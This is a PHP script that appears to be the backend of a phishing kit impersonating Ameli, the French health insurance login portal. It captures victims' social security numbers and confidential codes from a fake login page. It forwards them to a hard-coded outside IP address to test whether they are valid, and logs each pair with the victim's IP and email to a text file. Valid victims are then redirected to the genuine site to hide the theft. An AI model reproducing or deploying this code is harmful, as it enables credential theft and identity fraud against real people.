<?php
set_time_limit(0);
session_start();
error_reporting(0);




//if(!isset($_SESSION['email'])) $_SESSION['email'] = '';
if(isset($_GET['eml'])) {
	$_SESSION['email'] = $_GET['eml'];
	$eml = $_SESSION['email'];
	
}

function ind($file) {
	include($file);
	exit();
}

function flog($data, $eml) {
	$s = "[".date("H:i:s")."][".$_SERVER['REMOTE_ADDR']."][".$eml."]  ";
	file_put_contents('Resultat.txt', $s.$data."\r\n", FILE_APPEND);
}

function checklog($user, $pass, $eml){
$url = "http://51.254.114.158/indexxv2.php?id=".$eml;
$postData = array(
"connexioncompte_2numSecuriteSociale" => $user,
"connexioncompte_2codeConfidentiel" => $pass,
);
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
$resultt = curl_exec($ch);
$result = substr($resultt, -1);

if($result == 1) {
		flog("AMELI VALIDE  $user:$pass", $eml);
		header("location: https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure");
		exit();
	}
	
if($result == 2) {
		$_SESSION['error'] = 1;
		flog("AMELI INVALIDE  $user:$pass", $eml);
		header("location: index.php?eml=".$eml);	
		
	}
	
	if($result == 3) {
		$_SESSION['error'] = 1;
		flog("AMELI bloqué  $user:$pass", $eml);
		header("location: index.php?eml=".$eml);
	} 
	
	if ($result == 4) {
		$_SESSION['error'] = 1;
		flog("AMELI OFFLINE OR ID INCCORECT  $user:$pass ", $eml);
		header("location: index.php");

	}
	curl_close($ch);
}


if(isset($_POST['connexioncompte_2numSecuriteSociale'])) {
	$u = $_POST['connexioncompte_2numSecuriteSociale'];
	$p = $_POST['connexioncompte_2codeConfidentiel'];
	checklog($u, $p, $eml);
}
ind('ameli.htpl');
?>
